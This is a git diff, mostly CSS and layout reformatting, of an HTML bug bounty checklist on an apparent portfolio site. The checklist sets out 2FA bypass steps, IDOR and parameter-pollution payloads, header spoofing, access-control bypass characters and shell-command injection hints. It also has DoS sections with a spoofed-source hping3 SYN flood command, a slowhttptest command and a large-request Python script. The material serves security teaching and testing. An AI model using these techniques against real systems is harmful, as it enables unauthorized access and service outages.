@@ -1,8 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <title>Bug Hunting Checklist</title>
     <style>
         :root {
@@ -26,6 +28,7 @@
             background: var(--dark-bg);
             color: var(--text-color);
             line-height: 1.6;
+            overflow-x: hidden;
         }
 
         .header {
@@ -112,7 +115,7 @@
             margin-bottom: 2rem;
             color: var(--primary-color);
             text-align: center;
-            /* position: relative; */
+            position: relative;
             padding-bottom: 10px;
         }
 
@@ -319,39 +322,17 @@
             transition: width 0.1s ease;
         }
 
-        /* Responsive design */
-        @media (max-width: 768px) {
-            .header {
-                padding: 15px 3%;
-                flex-direction: column;
-                text-align: center;
-            }
-
-            .navbar {
-                margin-top: 15px;
-            }
-
-            .navbar a {
-                margin: 0 10px;
-            }
-
-            main {
-                padding: 100px 3% 40px;
-            }
-
-            h1 {
-                font-size: 2rem;
-            }
-
-            .category {
-                padding: 1rem;
-            }
-        }
-
         /* Animation for checklist items */
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .category {
@@ -359,36 +340,266 @@
             opacity: 0;
         }
 
-        .category:nth-child(1) { animation-delay: 0.1s; }
-        .category:nth-child(2) { animation-delay: 0.2s; }
-        .category:nth-child(3) { animation-delay: 0.3s; }
-        .category:nth-child(4) { animation-delay: 0.4s; }
-        .category:nth-child(6) { animation-delay: 0.5s; }
-        .category:nth-child(7) { animation-delay: 0.5s; }
-        .category:nth-child(8) { animation-delay: 0.5s; }
-        .category:nth-child(9) { animation-delay: 0.5s; }
-        .category:nth-child(10) { animation-delay: 0.5s; }
-        .category:nth-child(11) { animation-delay: 0.5s; }
-        .category:nth-child(12) { animation-delay: 0.5s; }
-        .category:nth-child(13) { animation-delay: 0.5s; }
-        .category:nth-child(14) { animation-delay: 0.5s; }
-        .category:nth-child(15) { animation-delay: 0.5s; }
-        .category:nth-child(16) { animation-delay: 0.5s; }
-        .category:nth-child(17) { animation-delay: 0.5s; }
-        .category:nth-child(18) { animation-delay: 0.5s; }
-        /* .category:nth-child(5) { animation-delay: 0.5s; } */
-        /* .category:nth-child(5) { animation-delay: 0.5s; } */
+        .category:nth-child(1) {
+            animation-delay: 0.1s;
+        }
 
-        /* Continue for as many items as you have */
+        .category:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .category:nth-child(3) {
+            animation-delay: 0.3s;
+        }
+
+        .category:nth-child(4) {
+            animation-delay: 0.4s;
+        }
+
+        .category:nth-child(5) {
+            animation-delay: 0.5s;
+        }
+
+        .category:nth-child(6) {
+            animation-delay: 0.6s;
+        }
+
+        .category:nth-child(7) {
+            animation-delay: 0.7s;
+        }
+
+        .category:nth-child(8) {
+            animation-delay: 0.8s;
+        }
+
+        .category:nth-child(9) {
+            animation-delay: 0.9s;
+        }
+
+        .category:nth-child(10) {
+            animation-delay: 1.0s;
+        }
+
+        .category:nth-child(11) {
+            animation-delay: 1.1s;
+        }
+
+        .category:nth-child(12) {
+            animation-delay: 1.2s;
+        }
+
+        .category:nth-child(13) {
+            animation-delay: 1.3s;
+        }
+
+        .category:nth-child(14) {
+            animation-delay: 1.4s;
+        }
+
+        .category:nth-child(15) {
+            animation-delay: 1.5s;
+        }
+
+        .category:nth-child(16) {
+            animation-delay: 1.6s;
+        }
+
+        .category:nth-child(17) {
+            animation-delay: 1.7s;
+        }
+
+        .category:nth-child(18) {
+            animation-delay: 1.8s;
+        }
+
+
+        /* Responsive Adjustments */
+
+
+        /* Mobile Menu Toggle */
+        .menu-toggle {
+            display: none;
+            cursor: pointer;
+            z-index: 101;
+            font-size: 24px;
+            color: white;
+            padding: 10px;
+        }
+
+        .menu-toggle i {
+            font-size: 28px;
+            color: #fff;
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 768px) {
+            .menu-toggle {
+                display: block;
+            }
+
+            .navbar {
+                position: fixed;
+                top: 0;
+                right: -100%;
+                width: 70%;
+                height: 100vh;
+                background: var(--dark-bg);
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                transition: right 0.5s ease;
+                z-index: 100;
+                border-left: 1px solid var(--primary-color);
+                padding-top: 60px;
+            }
+
+            .navbar.active {
+                right: 0;
+            }
+
+            .navbar a {
+                margin: 15px 0;
+                font-size: 20px;
+                margin-left: 0;
+            }
+
+            main {
+                padding-top: 100px;
+                padding-bottom: 60px;
+            }
+        }
+
+        @media (max-width: 1200px) {
+            main {
+                padding: 120px 3% 40px;
+            }
+
+            .category {
+                padding: 1.2rem;
+            }
+        }
+
+        @media (max-width: 992px) {
+            .header {
+                padding: 15px 3%;
+            }
+
+            h1 {
+                font-size: 2.2rem;
+            }
+
+            .category h3 {
+                font-size: 1.3rem;
+            }
+
+            .subcategory h4 {
+                font-size: 1.1rem;
+            }
+
+            pre {
+                font-size: 0.85rem;
+                padding: 0.8rem;
+            }
+        }
+
+
+
+
+        main {
+            padding: 100px 3% 40px;
+        }
+
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .category {
+            padding: 1rem;
+        }
+
+        .category h3 {
+            font-size: 1.2rem;
+        }
+
+        .subcategory h4 {
+            font-size: 1rem;
+        }
+
+        .steps p {
+            font-size: 0.95rem;
+        }
+
+        .fab {
+            width: 50px;
+            height: 50px;
+            font-size: 1.3rem;
+            bottom: 20px;
+            right: 20px;
+        }
+
+
+        @media (max-width: 576px) {
+            .logo {
+                font-size: 1.2rem;
+            }
+
+            h1 {
+                font-size: 1.8rem;
+            }
+
+            .category h3 {
+                font-size: 1.1rem;
+            }
+
+            .subcategory h4 {
+                font-size: 0.95rem;
+            }
+
+            .steps p {
+                font-size: 0.9rem;
+            }
+
+            pre {
+                font-size: 0.8rem;
+                padding: 0.7rem;
+            }
+
+            .navbar {
+                width: 80%;
+            }
+        }
+
+        @media (max-width: 400px) {
+            h1 {
+                font-size: 1.6rem;
+            }
+
+            .logo {
+                font-size: 1rem;
+            }
+
+            .category h3 {
+                font-size: 1rem;
+            }
+
+            .steps p {
+                font-size: 0.85rem;
+            }
+        }
     </style>
 </head>
+
 <body>
- <!--navbar starts -->
- 
-    
+    <!--navbar starts -->
+
+
     <header class="header">
         <a href="#" class="logo">ankush@portfolio:~$</a>
-
+        <div class="menu-toggle">
+            <i class="fas fa-bars"></i>
+        </div>
         <nav class="navbar">
             <a href="index.html" class="active">Home</a>
             <a href="about.html">About</a>
@@ -396,17 +607,19 @@
             <a href="Skills.html">Skills</a>
             <a href="contact.html">Contact</a>
         </nav>
-        
-        
-    
-    </header>
-    
-    <!--navbar finish -->
-    	
-    <main>
-                <h1>Bug Hunting Checklist</h1>
 
-     <!-- 2FA Bypass Category -->
+
+
+    </header>
+
+
+
+    <!--navbar finish -->
+
+    <main>
+        <h1>Bug Hunting Checklist</h1>
+
+        <!-- 2FA Bypass Category -->
         <div class="category">
             <h3><input type="checkbox" id="2fa-bypass">1 > 2FA Bypass</h3>
             <div class="subcategory">
@@ -425,16 +638,19 @@
 
                 <h4><input type="checkbox" id="direct-bypass"> Direct Bypass</h4>
                 <div class="steps">
-                    <p>1) Just try to access the next endpoint directly (you need to know the path of the next endpoint).</p>
+                    <p>1) Just try to access the next endpoint directly (you need to know the path of the next
+                        endpoint).</p>
                     <p>2) If this doesn't work, try to change the Referrer header as if you came from the 2FA page.</p>
                     <p>Example: site.com/login/otp_verification → site.com/login/new_password</p>
                 </div>
 
                 <h4><input type="checkbox" id="referrer-check-bypass"> Referrer Check Bypass</h4>
                 <div class="steps">
-                    <p>Try to navigate to the page which comes after 2FA or any other authenticated page of the application.</p>
+                    <p>Try to navigate to the page which comes after 2FA or any other authenticated page of the
+                        application.</p>
                     <p>If there is no success, change the refer header to the 2FA page URL.</p>
-                    <p>This may fool the application into pretending the request came after satisfying the 2FA condition.</p>
+                    <p>This may fool the application into pretending the request came after satisfying the 2FA
+                        condition.</p>
                 </div>
 
                 <h4><input type="checkbox" id="developers-check"> Developer’s Check</h4>
@@ -443,21 +659,25 @@
                     <p>2) Inspect element</p>
                     <p>3) Functions like “checkOTP(event)”</p>
                     <p>4) Type the function in the console</p>
-                    <p><a href="https://shahjerry33.medium.com/otp-bypass-developers-check-5786885d55c6" target="_blank">Reference Link</a></p>
+                    <p><a href="https://shahjerry33.medium.com/otp-bypass-developers-check-5786885d55c6"
+                            target="_blank">Reference Link</a></p>
                 </div>
 
                 <h4><input type="checkbox" id="x-forwarded-for"> X-Forwarded-For</h4>
                 <div class="steps">
                     <p>Add X-Forwarded-For: 127.0.0.1 in the request. If it does not work, try:</p>
-                    <p>X-Originating-IP, X-Forwarded-Fo, X-Remote-IP, X-Remote-Addr, X-Client-IP, X-Host, X-Forwared-Host</p>
+                    <p>X-Originating-IP, X-Forwarded-Fo, X-Remote-IP, X-Remote-Addr, X-Client-IP, X-Host,
+                        X-Forwared-Host</p>
                 </div>
 
                 <h4><input type="checkbox" id="session-permission"> Session Permission</h4>
                 <div class="steps">
                     <p>Using the same session, start the flow using your account and the victim's account.</p>
-                    <p>When reaching the 2FA point with both accounts, complete the 2FA with your account but do not access the next part.</p>
+                    <p>When reaching the 2FA point with both accounts, complete the 2FA with your account but do not
+                        access the next part.</p>
                     <p>Instead, try to access the next step with the victim's account flow.</p>
-                    <p>If the backend only sets a boolean inside your session indicating you have successfully passed the 2FA, you will be able to bypass the 2FA of the victim.</p>
+                    <p>If the backend only sets a boolean inside your session indicating you have successfully passed
+                        the 2FA, you will be able to bypass the 2FA of the victim.</p>
                 </div>
 
                 <h4><input type="checkbox" id="reusing-token"> Reusing Token</h4>
@@ -467,7 +687,8 @@
 
                 <h4><input type="checkbox" id="sharing-unused-tokens"> Sharing Unused Tokens</h4>
                 <div class="steps">
-                    <p>Check if you can get a token for your account and try to use it to bypass the 2FA in a different account.</p>
+                    <p>Check if you can get a token for your account and try to use it to bypass the 2FA in a different
+                        account.</p>
                 </div>
 
                 <h4><input type="checkbox" id="reveal-otp-codes"> Reveal Any Kind of OTP Codes in the Response</h4>
@@ -499,7 +720,7 @@
 
         <!-- API Security Category -->
         <div class="category">
-            <h3><input type="checkbox" id="api-security">2 >  API Security</h3>
+            <h3><input type="checkbox" id="api-security">2 > API Security</h3>
             <div class="subcategory">
                 <h4><input type="checkbox" id="31-days-api-security-testing"> 31 Days of API Security Testing</h4>
                 <div class="steps">
@@ -510,13 +731,18 @@
                     <p>5) Try Numeric IDs when facing a GUID/UUID: GET /api/users/6b95d962-df38 → GET /api/users/1</p>
                     <p>6) Wrap ID with an array: {"id":111} → {"id":[111]}</p>
                     <p>7) Wrap ID with a JSON object: {"id":111} → {"id":{"id":111}}</p>
-                    <p>8) HTTP Parameter Pollution: /api/profile?user_id=legit&user_id=victim /api/profile?user_id=victim&user_id=legit</p>
-                    <p>9) JSON Parameter Pollution: {"user_id":legit,"user_id":victim} {"user_id":victim,"user_id":legit}</p>
-                    <p>10) Wildcard instead of ID: /api/users/1 → /api/users/* /api/users/% /api/users/_ /api/users/.</p>
-                    <p>11) Ruby application HTTP parameter containing a URL → Pipe as the first character and then a shell command.</p>
+                    <p>8) HTTP Parameter Pollution: /api/profile?user_id=legit&user_id=victim
+                        /api/profile?user_id=victim&user_id=legit</p>
+                    <p>9) JSON Parameter Pollution: {"user_id":legit,"user_id":victim}
+                        {"user_id":victim,"user_id":legit}</p>
+                    <p>10) Wildcard instead of ID: /api/users/1 → /api/users/* /api/users/% /api/users/_ /api/users/.
+                    </p>
+                    <p>11) Ruby application HTTP parameter containing a URL → Pipe as the first character and then a
+                        shell command.</p>
                     <p>12) Developer APIs differ with mobile and web APIs. Test them separately.</p>
                     <p>13) Change Content-Type to application/xml and see if the API parses it.</p>
-                    <p>14) Non-Production environments tend to be less secure (staging/qa/etc.) Leverage this fact to bypass AuthZ, AuthN, rate limiting & input validation.</p>
+                    <p>14) Non-Production environments tend to be less secure (staging/qa/etc.) Leverage this fact to
+                        bypass AuthZ, AuthN, rate limiting & input validation.</p>
                     <p>15) Export Injection if you see Convert to PDF feature.</p>
                     <p>16) Expand your attack surface and test old versions of APKs/IPAs.</p>
                 </div>
@@ -526,28 +752,36 @@
                     <p>Check different Content-Types</p>
                     <p>x-www-form-urlencoded → user=test</p>
                     <p>application/json → {"user": "test"}</p>
-                    <p>application/xml → <user>test</user></p>
-                    <p>If it's regular POST data, try sending arrays, dictionaries: username[]=John, username[$neq]=lalala</p>
-                    <p>If JSON is supported, try to send unexpected data types: {"username": "John"}, {"username": true}, {"username": null}, {"username": 1}, {"username": [true]}, {"username": ["John", true]}, {"username": {"$neq": "lalala"}}</p>
+                    <p>application/xml → <user>test</user>
+                    </p>
+                    <p>If it's regular POST data, try sending arrays, dictionaries: username[]=John,
+                        username[$neq]=lalala</p>
+                    <p>If JSON is supported, try to send unexpected data types: {"username": "John"}, {"username":
+                        true}, {"username": null}, {"username": 1}, {"username": [true]}, {"username": ["John", true]},
+                        {"username": {"$neq": "lalala"}}</p>
                     <p>If XML is supported, check for XXE.</p>
                 </div>
 
                 <h4><input type="checkbox" id="references"> References</h4>
                 <div class="references">
-                    <p><a href="https://github.com/inonshk/31-days-of-API-Security-Tips" target="_blank">31 Days of API Security Tips</a></p>
-                    <p><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/api-pentesting" target="_blank">API Pentesting</a></p>
-                    <p><a href="https://github.com/HolyBugx/HolyTips/blob/main/Checklist/API%20Security.md" target="_blank">API Security Checklist</a></p>
+                    <p><a href="https://github.com/inonshk/31-days-of-API-Security-Tips" target="_blank">31 Days of API
+                            Security Tips</a></p>
+                    <p><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/api-pentesting"
+                            target="_blank">API Pentesting</a></p>
+                    <p><a href="https://github.com/HolyBugx/HolyTips/blob/main/Checklist/API%20Security.md"
+                            target="_blank">API Security Checklist</a></p>
                 </div>
             </div>
         </div>
 
         <!-- Account Takeover Category -->
         <div class="category">
-            <h3><input type="checkbox" id="account-takeover">3 >  Account Takeover</h3>
+            <h3><input type="checkbox" id="account-takeover">3 > Account Takeover</h3>
             <div class="subcategory">
                 <h4><input type="checkbox" id="account-takeover-tip"> Account TakeOver Tip</h4>
                 <div class="steps">
-                    <p>Always try getting an account with a duplicate/existing email, you might end up taking over the original account.</p>
+                    <p>Always try getting an account with a duplicate/existing email, you might end up taking over the
+                        original account.</p>
                 </div>
 
                 <h4><input type="checkbox" id="auth-bypass-signup"> Authentication Bypass Due Signup Enabled</h4>
@@ -564,35 +798,36 @@
 
         <!-- Broken Access Control Category -->
         <div class="category">
-            <h3><input type="checkbox" id="broken-access-control">4 >  Broken Access Control (BAC)</h3>
+            <h3><input type="checkbox" id="broken-access-control">4 > Broken Access Control (BAC)</h3>
             <div class="subcategory">
                 <h4><input type="checkbox" id="appending-unusual-characters"> Appending Unusual Characters</h4>
                 <div class="steps">
-                    <p>Appending unusual characters at the end of file names can sometimes disrupt parsing logic in web applications, leading to access control bypass. Here are some common characters:</p>
+                    <p>Appending unusual characters at the end of file names can sometimes disrupt parsing logic in web
+                        applications, leading to access control bypass. Here are some common characters:</p>
                     <p>;<br>
-/<br>
-"<br>
-'<br>
-';<br>
-";<br>
-");<br>
-');<br>
-"]<br>
-)]}<br>
-%09<br>
-%20<br>
-%23<br>
-%2e<br>
-%2f<br>
-.<br>
-;<br>
-..;<br>
-;%09<br>
-;%09..<br>
-;%09..;<br>
-;%2f..<br>
-*<br>
-                   </p>
+                        /<br>
+                        "<br>
+                        '<br>
+                        ';<br>
+                        ";<br>
+                        ");<br>
+                        ');<br>
+                        "]<br>
+                        )]}<br>
+                        %09<br>
+                        %20<br>
+                        %23<br>
+                        %2e<br>
+                        %2f<br>
+                        .<br>
+                        ;<br>
+                        ..;<br>
+                        ;%09<br>
+                        ;%09..<br>
+                        ;%09..;<br>
+                        ;%2f..<br>
+                        *<br>
+                    </p>
                     <p>Example 1: Semicolon Appended to File Name</p>
                     <p>site.com/admin 403 → site.com/admin; 200</p>
                 </div>
@@ -614,32 +849,43 @@
 
                 <h4><input type="checkbox" id="verb-tampering"> Verb Tampering</h4>
                 <div class="steps">
-                    <p>HTTP Verb Tampering tests the web application’s response to different HTTP methods accessing system objects. For every system object discovered during spidering, attempt accessing all of those objects with every HTTP method.</p>
-                    <p>The HTTP specification includes request methods other than the standard GET and POST requests. Standards compliant web servers may respond to these alternative methods in unexpected ways.</p>
-                    <p>Try different HTTP verbs, including HEAD, TRACE, TRACK, PUT, DELETE, etc., and arbitrary strings like "JEFF".</p>
+                    <p>HTTP Verb Tampering tests the web application’s response to different HTTP methods accessing
+                        system objects. For every system object discovered during spidering, attempt accessing all of
+                        those objects with every HTTP method.</p>
+                    <p>The HTTP specification includes request methods other than the standard GET and POST requests.
+                        Standards compliant web servers may respond to these alternative methods in unexpected ways.</p>
+                    <p>Try different HTTP verbs, including HEAD, TRACE, TRACK, PUT, DELETE, etc., and arbitrary strings
+                        like "JEFF".</p>
                 </div>
 
                 <h4><input type="checkbox" id="bypass-vbaac-head"> Bypassing VBAAC with HEAD</h4>
                 <div class="steps">
-                    <p>The HEAD request should produce the same results as a GET request but with no response body. This means you can use HEAD to bypass many VBAAC security mechanisms.</p>
+                    <p>The HEAD request should produce the same results as a GET request but with no response body. This
+                        means you can use HEAD to bypass many VBAAC security mechanisms.</p>
                     <p>Example: http://yourcompany.com/admin/admin.jsp?fn=deleteUser</p>
                 </div>
 
-                <h4><input type="checkbox" id="bypass-vbaac-arbitrary-verbs"> Bypassing VBAAC with Arbitrary HTTP Verbs</h4>
+                <h4><input type="checkbox" id="bypass-vbaac-arbitrary-verbs"> Bypassing VBAAC with Arbitrary HTTP Verbs
+                </h4>
                 <div class="steps">
-                    <p>Some platforms allow arbitrary HTTP verbs which execute similarly to GET requests, making it possible to bypass VBAAC implementations.</p>
+                    <p>Some platforms allow arbitrary HTTP verbs which execute similarly to GET requests, making it
+                        possible to bypass VBAAC implementations.</p>
                     <p>Example: Using "JEFF" method instead of "HEAD".</p>
                 </div>
 
                 <h4><input type="checkbox" id="use-http-1.0"> Use HTTP/1.0 Instead of HTTP/1.1</h4>
                 <div class="steps">
-                    <p>Downgrade HTTP/1.1 to HTTP/1.0 and remove all headers. This can trick some servers into misinterpreting the request.</p>
+                    <p>Downgrade HTTP/1.1 to HTTP/1.0 and remove all headers. This can trick some servers into
+                        misinterpreting the request.</p>
                 </div>
 
-                <h4><input type="checkbox" id="non-standard-headers"> Overriding the Request with Non-Standard Headers</h4>
+                <h4><input type="checkbox" id="non-standard-headers"> Overriding the Request with Non-Standard Headers
+                </h4>
                 <div class="steps">
-                    <p>Attempt to override requests with non-standard headers to bypass security measures. Common headers include:</p>
-                    <p>X-Custom-IP-Authorization, X-Forwarded-For, X-Forward-For, X-Remote-IP, X-Originating-IP, X-Remote-Addr, X-Client-IP, X-Real-IP</p>
+                    <p>Attempt to override requests with non-standard headers to bypass security measures. Common
+                        headers include:</p>
+                    <p>X-Custom-IP-Authorization, X-Forwarded-For, X-Forward-For, X-Remote-IP, X-Originating-IP,
+                        X-Remote-Addr, X-Client-IP, X-Real-IP</p>
                     <p>Values: localhost, 127.0.0.1, 2130706433, 0x7F000001, etc.</p>
                 </div>
 
@@ -652,7 +898,7 @@
         </div>
         <!-- CRLF Category -->
         <div class="category">
-            <h3><input type="checkbox" id="crlf">5 >  CRLF - Carriage Return Line Feed</h3>
+            <h3><input type="checkbox" id="crlf">5 > CRLF - Carriage Return Line Feed</h3>
             <div class="subcategory">
                 <h4><input type="checkbox" id="response-splitting"> Response Splitting</h4>
                 <div class="steps">
@@ -686,7 +932,7 @@
 
         <!-- CSRF Bypass Category -->
         <div class="category">
-            <h3><input type="checkbox" id="csrf-bypass">6 >  CSRF Bypass</h3>
+            <h3><input type="checkbox" id="csrf-bypass">6 > CSRF Bypass</h3>
             <div class="subcategory">
                 <h4><input type="checkbox" id="change-single-char"> 1 - Change Single Char</h4>
                 <div class="steps">
@@ -752,32 +998,65 @@
         <!-- DoS Category -->
         <div class="category">
             <h3><input type="checkbox" id="dos">7 > DoS</h3>
-            
+
             <!-- TCP SYN Flood DoS Attack -->
             <div class="subcategory">
                 <h4><input type="checkbox" id="tcp-syn-flood"> TCP SYN Flood DoS Attack</h4>
                 <div class="steps content">
-                    <p>DoS attacks are simple to carry out, can cause serious downtime, and aren’t always obvious. In a SYN flood attack, a malicious party exploits the TCP protocol 3-way handshake to quickly cause service and network disruptions, ultimately leading to a Denial of Service (DoS) Attack. These type of attacks can easily take admins by surprise and can become challenging to identify. Luckily tools like Wireshark makes it an easy process to capture and verify any suspicions of a DoS Attack.</p>
-                    
+                    <p>DoS attacks are simple to carry out, can cause serious downtime, and aren’t always obvious. In a
+                        SYN flood attack, a malicious party exploits the TCP protocol 3-way handshake to quickly cause
+                        service and network disruptions, ultimately leading to a Denial of Service (DoS) Attack. These
+                        type of attacks can easily take admins by surprise and can become challenging to identify.
+                        Luckily tools like Wireshark makes it an easy process to capture and verify any suspicions of a
+                        DoS Attack.</p>
+
                     <h3>HOW TCP SYN FLOOD ATTACKS WORK</h3>
-                    <p>When a client attempts to connect to a server using the TCP protocol e.g (HTTP or HTTPS), it is first required to perform a three-way handshake before any data is exchanged between the two. Since the three-way TCP handshake is always initiated by the client it sends a SYN packet to the server.</p>
-                    <img src="https://user-images.githubusercontent.com/63053441/200159004-f6e1bddb-6629-47d5-a793-41f035a0ddfa.png" alt="TCP Handshake">
-                    <p>The server next replies acknowledging the request and at the same time sends its own SYN request – this is the SYN-ACK packet. The finally the client sends an ACK packet which confirms both two hosts agree to create a connection. The connection is therefore established and data can be transferred between them.</p>
-                    <p>In a SYN flood, the attacker sends a high volume of SYN packets to the server using spoofed IP addresses causing the server to send a reply (SYN-ACK) and leave its ports half-open, awaiting for a reply from a host that doesn’t exist:</p>
-                    <img src="https://user-images.githubusercontent.com/63053441/200159205-2735b7d0-5540-42cb-ad1e-23f7ceba9b4c.png" alt="SYN Flood Attack">
-                    <img src="https://user-images.githubusercontent.com/63053441/200159015-42f5ca86-1c89-480d-9b7a-038315764e61.png" alt="SYN Flood Example">
-                    
-                    <p>In a simpler, direct attack (without IP spoofing), the attacker will simply use firewall rules to discard SYN-ACK packets before they reach him. By flooding a target with SYN packets and not responding (ACK), an attacker can easily overwhelm the target’s resources. In this state, the target struggles to handle traffic which in turn will increase CPU usage and memory consumption ultimately leading to the exhaustion of its resources (CPU and RAM). At this point the server will no longer be able to serve legitimate client requests and ultimately lead to a Denial-of-Service.</p>
-                    
+                    <p>When a client attempts to connect to a server using the TCP protocol e.g (HTTP or HTTPS), it is
+                        first required to perform a three-way handshake before any data is exchanged between the two.
+                        Since the three-way TCP handshake is always initiated by the client it sends a SYN packet to the
+                        server.</p>
+                    <img src="https://user-images.githubusercontent.com/63053441/200159004-f6e1bddb-6629-47d5-a793-41f035a0ddfa.png"
+                        alt="TCP Handshake">
+                    <p>The server next replies acknowledging the request and at the same time sends its own SYN request
+                        – this is the SYN-ACK packet. The finally the client sends an ACK packet which confirms both two
+                        hosts agree to create a connection. The connection is therefore established and data can be
+                        transferred between them.</p>
+                    <p>In a SYN flood, the attacker sends a high volume of SYN packets to the server using spoofed IP
+                        addresses causing the server to send a reply (SYN-ACK) and leave its ports half-open, awaiting
+                        for a reply from a host that doesn’t exist:</p>
+                    <img src="https://user-images.githubusercontent.com/63053441/200159205-2735b7d0-5540-42cb-ad1e-23f7ceba9b4c.png"
+                        alt="SYN Flood Attack">
+                    <img src="https://user-images.githubusercontent.com/63053441/200159015-42f5ca86-1c89-480d-9b7a-038315764e61.png"
+                        alt="SYN Flood Example">
+
+                    <p>In a simpler, direct attack (without IP spoofing), the attacker will simply use firewall rules to
+                        discard SYN-ACK packets before they reach him. By flooding a target with SYN packets and not
+                        responding (ACK), an attacker can easily overwhelm the target’s resources. In this state, the
+                        target struggles to handle traffic which in turn will increase CPU usage and memory consumption
+                        ultimately leading to the exhaustion of its resources (CPU and RAM). At this point the server
+                        will no longer be able to serve legitimate client requests and ultimately lead to a
+                        Denial-of-Service.</p>
+
                     <h3>How To Test TCP SYN FLOOD DOS ATTACK?</h3>
-                    <p>However, to test if you can detect this type of a DoS attack, you must be able to perform one. The simplest way is via a Kali Linux and more specifically the hping3, a popular TCP penetration testing tool included in Kali Linux.</p>
-                    <p>Alternatively Linux users can install hping3 in their existing Linux distribution using the command:</p>
+                    <p>However, to test if you can detect this type of a DoS attack, you must be able to perform one.
+                        The simplest way is via a Kali Linux and more specifically the hping3, a popular TCP penetration
+                        testing tool included in Kali Linux.</p>
+                    <p>Alternatively Linux users can install hping3 in their existing Linux distribution using the
+                        command:</p>
                     <pre><code>sudo apt-get install hping3</code></pre>
-                    <p>In most cases, attackers will use hping or another tool to spoof IP random addresses, so that’s what we’re going to focus on. The line below lets us start and direct the SYN flood attack to our target (192.168.1.159):</p>
+                    <p>In most cases, attackers will use hping or another tool to spoof IP random addresses, so that’s
+                        what we’re going to focus on. The line below lets us start and direct the SYN flood attack to
+                        our target (192.168.1.159):</p>
                     <pre><code>hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.159</code></pre>
-                    <img src="https://user-images.githubusercontent.com/63053441/200159063-df24f0c9-c234-4821-a2ee-0e81a7c4ddca.png" alt="hping3 Command">
+                    <img src="https://user-images.githubusercontent.com/63053441/200159063-df24f0c9-c234-4821-a2ee-0e81a7c4ddca.png"
+                        alt="hping3 Command">
                     <p>Let’s explain in detail the above command:</p>
-                    <p>We’re sending 15000 packets (-c 15000) at a size of 120 bytes (-d 120) each. We’re specifying that the SYN Flag (-S) should be enabled, with a TCP window size of 64 (-w 64). To direct the attack to our victum’s HTTP web server we specify port 80 (-p 80) and use the --flood flag to send packets as fast as possible. As you’d expect, the --rand-source flag generates spoofed IP addresses to disguise the real source and avoid detection but at the same time stop the victim’s SYN-ACK reply packets from reaching the attacker.</p>
+                    <p>We’re sending 15000 packets (-c 15000) at a size of 120 bytes (-d 120) each. We’re specifying
+                        that the SYN Flag (-S) should be enabled, with a TCP window size of 64 (-w 64). To direct the
+                        attack to our victum’s HTTP web server we specify port 80 (-p 80) and use the --flood flag to
+                        send packets as fast as possible. As you’d expect, the --rand-source flag generates spoofed IP
+                        addresses to disguise the real source and avoid detection but at the same time stop the victim’s
+                        SYN-ACK reply packets from reaching the attacker.</p>
                 </div>
             </div>
 
@@ -785,7 +1064,13 @@
             <div class="subcategory">
                 <h4><input type="checkbox" id="slow-http"> Slow HTTP GET/POST Vulnerability</h4>
                 <div class="steps content">
-                    <p>Slow HTTP attacks are denial-of-service (DoS) attacks that rely on the fact that the HTTP protocol, by design, requires a request to be completely received by the server before it is processed. If an HTTP request is not complete, or if the transfer rate is very low, the server keeps its resources busy waiting for the rest of the data. When the server’s concurrent connection pool reaches its maximum, this creates a denial of service. These attacks are problematic because they are easy to execute, i.e. they can be executed with minimal resources from the attacking machine.</p>
+                    <p>Slow HTTP attacks are denial-of-service (DoS) attacks that rely on the fact that the HTTP
+                        protocol, by design, requires a request to be completely received by the server before it is
+                        processed. If an HTTP request is not complete, or if the transfer rate is very low, the server
+                        keeps its resources busy waiting for the rest of the data. When the server’s concurrent
+                        connection pool reaches its maximum, this creates a denial of service. These attacks are
+                        problematic because they are easy to execute, i.e. they can be executed with minimal resources
+                        from the attacking machine.</p>
                     <pre><code>sudo apt install slowhttptest</code></pre>
                     <pre><code>slowhttptest -c 10000 -H -g -o slowhttp -i 1 -r 2000 -t GET -u https://example.com -x 2400 -p 3</code></pre>
                 </div>
@@ -795,8 +1080,9 @@
             <div class="subcategory">
                 <h4><input type="checkbox" id="big-entity"> Big Entity</h4>
                 <div class="steps content">
-                    <p>Try sending a big request to the server. You can do it by sending a request with POST method to root with custom parameter or try in other fields like password or uploaders file name.</p>
-                    
+                    <p>Try sending a big request to the server. You can do it by sending a request with POST method to
+                        root with custom parameter or try in other fields like password or uploaders file name.</p>
+
                     <h5>3.1) Python Script to Send Large File (a.txt with 50mb) as Parameter to Root Directory:</h5>
                     <pre><code>
 import requests
@@ -817,15 +1103,27 @@ response = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies,
 print(response)
 print(f'Time: {time.time() - start}')
                     </code></pre>
-                    <p>If Server is processing our request for a long time and doesn't give a timeout to us, it's vulnerable.</p>
-                    
-                    <h5>3.2) Denial of Service Based on Comparing the Measured Response Times and Triggering a 5XX Error:</h5>
-                    <p>This technique works for inputs that are not getting back in response and attacker wants to use server resources. Now most of programs don’t accept this kind of bug.</p>
-                    <p>By sending a very long string (100000 characters) it’s possible to cause a denial of service attack on the server. This may lead to the website becoming unavailable or unresponsive. Usually this problem is caused by a vulnerable string hashing implementation. When a long string is sent, the string hashing process will result in CPU and memory exhaustion.</p>
-                    <p>This vulnerability must be detected by sending strings with various lengths and comparing the measured response times. And you can confirm this vulnerability with 500 Internal Server Error.</p>
-                    <p>The most likely field is the password because we know that it is mostly stored as a hash on the server.</p>
-                    <p>By sending a very long password (1.000.000 characters) it's possible to cause a denial of service attack on the server. This may lead to the website becoming unavailable or unresponsive. Usually this problem is caused by a vulnerable password hashing implementation. When a long password is sent, the password hashing process will result in CPU and memory exhaustion.</p>
-                    
+                    <p>If Server is processing our request for a long time and doesn't give a timeout to us, it's
+                        vulnerable.</p>
+
